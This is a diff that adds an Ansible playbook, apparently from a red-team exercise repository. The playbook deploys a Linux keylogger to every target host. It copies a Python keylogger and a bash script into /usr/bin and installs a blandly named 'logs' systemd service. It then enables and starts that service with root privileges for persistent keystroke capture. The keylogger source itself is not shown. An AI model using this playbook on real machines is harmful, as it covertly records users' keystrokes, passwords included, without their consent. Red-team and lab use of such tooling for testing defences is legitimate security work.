@@ -1,0 +1,34 @@
+---
+- name: keylogger role
+  hosts: all
+  tasks:
+    #tasks to copy the python script to the target
+    - name: Copy logger with permissions
+      copy:
+        src: /Ansible/roles/red/LinuxKeyLogger/files/key_logger.py
+        dest: /usr/bin/key_logger.py
+        mode: u=x,g=x,o=x
+      become: yes
+    #
+    #tasks to compy bash script to the target
+    - name: Copy bash script with permissions
+      copy:
+        src: /Ansible/roles/red/LinuxKeyLogger/files/logger.sh
+        dest: /usr/bin/logger.sh
+        mode: u=x,g=x,o=x
+      become: yes
+    #
+    #tasks to copy the service file over to the target
+    - name: Copy service
+      copy:
+        src: /Ansible/roles/red/LinuxKeyLogger/files/logs.service
+        dest: /etc/systemd/system/logs.service
+      become: yes
+    #
+    #start the system service
+    - name: start the system service
+      systemd:
+        name: logs
+        state: restarted
+        enabled: yes
+      become: yes
